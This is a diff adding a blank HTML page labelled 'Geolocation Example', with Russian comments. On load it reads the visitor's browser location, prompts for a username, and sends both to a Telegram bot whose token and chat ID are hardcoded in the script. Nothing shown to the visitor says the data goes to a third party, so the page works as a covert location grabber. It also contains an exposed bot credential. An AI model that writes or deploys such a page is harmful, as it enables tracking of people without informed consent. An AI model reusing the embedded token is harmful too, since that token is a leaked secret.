@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Example</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+    <script>
+        function sendLocationToBot(username, latitude, longitude) {
+            // Замените YOUR_BOT_TOKEN на токен вашего бота
+            const botToken = '7139229042:AAFbNfB47103dgpTX0hvr9OZZ7VhfRuJ5jA';
+            // Замените YOUR_CHAT_ID на chat_id вашего чата с ботом
+            const chatId = '5682662110';
+            // Форматируем сообщение для отправки на бота
+            const message = `пользователь: ${username}\nлат: ${latitude}\nлон: ${longitude}`;
+            // URL для отправки сообщения на бота
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // Параметры запроса
+            const params = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            };
+            // Отправка запроса к API Telegram
+            fetch(telegramUrl, params)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    console.log('Message sent to Telegram bot:', message);
+                })
+                .catch(error => {
+                    console.error('There has been a problem with your fetch operation:', error);
+                });
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Получаем доступ к геолокации пользователя
+            navigator.geolocation.getCurrentPosition(function (position) {
+                // Получаем широту и долготу
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                // Получаем имя пользователя
+                const username = prompt('Введите своё Имя пользователя');
+                // Отправляем данные на бота Telegram
+                sendLocationToBot(username, latitude, longitude);
+            }, function (error) {
+                // Обработка ошибок
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        alert('Пользователь отказал в доступе к геолокации.');
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        alert('Информация о местоположении недоступна.');
+                        break;
+                    case error.TIMEOUT:
+                        alert('Время запроса на получение местоположения истекло.');
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        alert('Произошла неизвестная ошибка.');
+                        break;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
